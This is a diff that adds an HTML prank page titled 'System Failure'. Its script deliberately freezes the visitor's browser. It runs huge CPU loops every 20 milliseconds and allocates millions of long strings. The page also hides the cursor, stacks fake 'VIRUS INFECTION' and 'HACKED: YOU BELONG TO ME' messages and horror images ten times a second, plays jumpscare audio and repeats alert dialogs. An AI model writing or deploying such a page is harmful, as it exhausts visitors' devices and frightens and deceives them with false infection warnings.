@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Failure</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: #000;
+            font-family: 'Courier New', monospace;
+            cursor: none;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+        .error-text {
+            position: absolute;
+            color: #0f0;
+            font-size: 24px;
+            text-shadow: 0 0 10px #0f0, 0 0 15px #00ff00;
+            pointer-events: none;
+        }
+        .horror-image {
+            position: absolute;
+            pointer-events: none;
+            opacity: 0.85;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="lagCanvas"></canvas>
+    <audio id="bgSound" loop>
+        <source src="eerie_noise.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <audio id="jumpscareSound">
+        <source src="jumpscare.wav" type="audio/wav">
+        Your browser does not support the audio element.
+    </audio>
+    <script>
+        // Play background sound
+        const bgSound = document.getElementById('bgSound');
+        bgSound.volume = 0.8;
+        bgSound.play().catch(() => console.log("Autoplay blocked"));
+
+        // Induce heavy lag
+        function induceLag() {
+            // Complex math operations
+            let i = 0;
+            while (i < 6000000) {
+                Math.sin(Math.random() * Math.tan(Math.random() * Math.sqrt(Math.random() * 75)));
+                i++;
+            }
+            // Memory allocation
+            let memoryHog = new Array(3000000).fill().map(() => Math.random().toString(36).repeat(1000));
+            // Nested loop
+            function nestedLoop(count = 0) {
+                if (count < 1500) {
+                    let temp = new Array(10000).fill(Math.random());
+                    temp.forEach(() => Math.random() * Math.cos(Math.random()));
+                    nestedLoop(count + 1);
+                }
+            }
+            nestedLoop();
+            // Additional loop for CPU load
+            function extraLoop() {
+                let j = 0;
+                while (j < 3000000) {
+                    Math.random() * Math.cos(Math.random() * 150);
+                    j++;
+                }
+            }
+            extraLoop();
+            setTimeout(induceLag, 20);
+        }
+
+        // Canvas particle system for GPU load, minimal for black dominance
+        const canvas = document.getElementById('lagCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const particles = [];
+        for (let i = 0; i < 300; i++) {
+            particles.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: Math.random() * 8 - 4,
+                vy: Math.random() * 8 - 4,
+                size: Math.random() * 6 + 3
+            });
+        }
+        function animateParticles() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.4)'; // Darker for black dominance
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                p.x += p.vx;
+                p.y += p.vy;
+                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fillStyle = `hsl(${Math.random() * 60 + 60}, 100%, 50%)`; // Green glitch
+                ctx.globalAlpha = 0.3; // Transparent for black dominance
+                ctx.fill();
+                ctx.globalAlpha = 1.0;
+            });
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        // Spam error messages that stack, one by one
+        function spamErrorMessages() {
+            const messages = [
+                "SYSTEM CRASH: NO ESCAPE",
+                "VIRUS INFECTION: CORE BREACHED",
+                "DATA CORRUPTED: HOPE LOST",
+                "FATAL ERROR: SYSTEM DOOMED",
+                "INFECTED: NO WAY OUT",
+                "HACKED: YOU BELONG TO ME",
+                "CRITICAL FAILURE: ABANDON ALL HOPE",
+                "MALWARE DETECTED: SYSTEM OVERRIDE",
+                "MEMORY OVERLOAD: SHUTDOWN IMMINENT",
+                "ERROR 0xDEAD: YOUR DATA IS GONE",
+                "VIRUS SPREADING: NO RECOVERY",
+                "HACKER CONTROL: YOU'RE TRAPPED"
+            ];
+            const div = document.createElement('div');
+            div.className = 'error-text';
+            div.innerText = messages[Math.floor(Math.random() * messages.length)];
+            div.style.left = Math.random() * window.innerWidth + 'px';
+            div.style.top = Math.random() * window.innerHeight + 'px';
+            div.style.fontSize = Math.random() * 16 + 16 + 'px';
+            document.body.appendChild(div);
+        }
+        setInterval(spamErrorMessages, 100); // 1 text every 100ms = 10 per second
+
+        // Spam horror images that stack, one by one
+        function spamHorrorImages() {
+            const images = ['horror1.png', 'horror2.png', 'horror3.png', 'horror4.png'];
+            const jumpscareSound = document.getElementById('jumpscareSound');
+            jumpscareSound.volume = 0.85;
+            const img = document.createElement('img');
+            img.className = 'horror-image';
+            img.src = images[Math.floor(Math.random() * images.length)];
+            img.style.width = Math.random() * 400 + 150 + 'px';
+            img.style.left = Math.random() * window.innerWidth + 'px';
+            img.style.top = Math.random() * window.innerHeight + 'px';
+            document.body.appendChild(img);
+            if (Math.random() < 0.33) { // Play jumpscare every ~3 images
+                jumpscareSound.play().catch(() => console.log("Jumpscare sound blocked"));
+            }
+        }
+        setInterval(spamHorrorImages, 100); // 1 image every 100ms = 10 per second
+
+        // Virus alerts less frequent
+        function fakeAlerts() {
+            alert("VIRUS DETECTED: SYSTEM COLLAPSE IMMINENT!");
+            setTimeout(fakeAlerts, 10000);
+        }
+
+        // Start all effects
+        induceLag();
+        setInterval(spamErrorMessages, 100);
+        setInterval(spamHorrorImages, 100);
+        fakeAlerts();
+    </script>
+</body>
+</html>
